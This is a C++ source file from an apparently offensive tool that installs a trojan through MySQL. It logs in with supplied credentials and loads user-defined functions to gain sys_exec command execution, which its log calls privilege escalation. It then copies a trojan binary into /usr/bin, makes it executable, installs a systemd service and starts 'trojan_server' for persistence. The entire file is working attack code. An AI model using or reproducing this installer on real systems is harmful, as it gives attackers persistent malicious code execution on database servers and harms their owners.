/*
 Copyright (c) 2022 Haobin Chen

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.

 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.

 You should have received a copy of the GNU General Public License
 along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */
#include "trojan_installer.h"

#include <filesystem>

#include "trojan_udfs.h"

namespace trojan {
static inline std::string WrapCommand(const std::string& command) {
  const std::string ans = "SELECT sys_exec(\'" + command + "\')";
  logger->info("[+] Executing command: {}", ans);
  return ans;
}

void Installer::InitMySQL(void) {
  sql::ConnectOptionsMap connection_options = {
      {"hostName", address_},           {"port", port_},
      {"userName", username_},          {"password", passwd_},
      {"schema", "information_schema"},
  };

  driver_ = get_driver_instance();

  try {
    connection_ =
        std::unique_ptr<sql::Connection>(driver_->connect(connection_options));
  } catch (sql::SQLException& e) {
    logger->error("[-] {}", e.what());
    return;
  }

  if (!connection_->isValid()) {
    logger->error("[-] Cannot connect to the MySQL instance!");
    exit(1);
  } else {
    logger->info("[+] Successfully connected to the MySQL instance!");
    is_initialized_ = true;
  }

  statement_ = std::unique_ptr<sql::Statement>(connection_->createStatement());

  for (const auto udf : trojan::udf_strings) {
    logger->info("[+] Executing command: {}", udf);
    statement_->execute(udf);
  }

  logger->info("[+] The privilege escalation based on MySQL is set up.");
}

Installer::Installer(const std::string& address, const int port,
                     const std::string& username, const std::string& passwd)
    : address_(address), port_(port), username_(username), passwd_(passwd) {
  InitMySQL();
}

bool Installer::InstallTrojan(const std::string& file_path,
                              const std::string& service_path) {
  if (!is_initialized_) {
    logger->error("[-] MySQL instance is not initialized!");
    return false;
  }

  // Check if the given file exists.
  if (!std::filesystem::exists(file_path) ||
      !std::filesystem::exists(service_path)) {
    logger->error("[-] File does not exist!");
    return false;
  } else if (std::filesystem::is_directory(file_path) ||
             std::filesystem::is_directory(service_path)) {
    logger->error("[-] File is a directory!");
    return false;
  }

  // Get the absolute path.
  const std::filesystem::path absolute_path_file =
      std::filesystem::absolute(file_path);
  const std::filesystem::path absolute_path_service =
      std::filesystem::absolute(service_path);

  // First we copy the trojan binary to the /usr/bin directory.
  std::string command =
      WrapCommand("cp " + absolute_path_file.string() + " /usr/bin");
  statement_->executeQuery(command);

  // Then change the permission of the Trojan binary.
  command = WrapCommand("chmod +x /usr/bin/" +
                        std::filesystem::path(file_path).filename().string());
  statement_->executeQuery(command);

  // Copy the service file to the /etc/systemd/system directory.
  command = WrapCommand("cp " + absolute_path_service.string() +
                        " /etc/systemd/system");
  statement_->executeQuery(command);

  // Change the permission of the service file.
  command =
      WrapCommand("chmod 644 /etc/systemd/system/" +
                  std::filesystem::path(service_path).filename().string());
  statement_->executeQuery(command);

  // Reload the systemd daemon.
  command = WrapCommand("sudo systemctl daemon-reload");
  statement_->executeQuery(command);

  // Start the server.
  command = WrapCommand("sudo systemctl start trojan_server");
  statement_->executeQuery(command);

  return true;
}
}  // namespace trojan